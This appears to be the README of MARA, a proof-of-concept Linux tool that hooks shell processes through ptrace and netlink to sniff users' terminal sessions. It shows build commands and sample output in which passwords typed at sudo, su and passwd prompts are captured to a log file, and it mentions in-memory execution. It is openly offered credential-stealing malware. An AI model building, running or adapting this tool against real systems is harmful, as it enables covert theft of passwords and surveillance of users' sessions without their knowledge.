# MARA

MARA is a proof of concept tool waiting for shell execution with associated pty/tty using netlink socket and sniff user's terminal, as a static binary it works well with in memory execution using DEGU.

Concept behind this project comes from emptymonkey method of mitm a terminal ( look at https://github.com/emptymonkey/shelljack project ) to intercept and log user session (including ssh session passwd sudo su passwords etc.)

To build it you need musl-gcc with musl kernel-headers for netlink objects

```
$ make
make -C ptrace_do
make[1]: Entering directory '/home/user/work/mara/ptrace_do'
make[1]: Nothing to be done for 'all'.
make[1]: Leaving directory '/home/user/work/mara/ptrace_do'
make -C ctty
make[1]: Entering directory '/home/user/work/mara/ctty'
make[1]: Nothing to be done for 'all'.
make[1]: Leaving directory '/home/user/work/mara/ctty'
musl-gcc  -I. -Ictty -Iptrace_do -Wall -Os -s -static main.c  log.c shelljack.c -o mara ptrace_do/libptrace_do.a ctty/libctty.a
$ sudo ./mara
(151814) 15:09:05.486343: main.c            jack              #34  	handle pid=151820 exe=/usr/bin/bash stdin=/proc/151820/fd/0 pty=/dev/pts/3 user=user
^C
$ sudo cat /tmp/user_151820_1659445745 
15:09 user@x03:~$ export LC_ALL=C
15:09 user@x03:~$ echo sniffed term ?
sniffed term ?
15:09 user@x03:~$ sudo su
[sudo] password for user: sniffed sudo ?
Sorry, try again.
[sudo] password for user: 
Sorry, try again.
[sudo] password for user: 
sudo: 3 incorrect password attempts
15:09 user@x03:~$ passwd 
Changing password for user.
Current password: sniffed passw ?
passwd: Authentication failure
passwd: password unchanged
15:09 user@x03:~$ ssh localhost -l sniffed 
sniffed@localhost: Permission denied (publickey).
15:09 user@x03:~$ 
exit
$ 

```

 
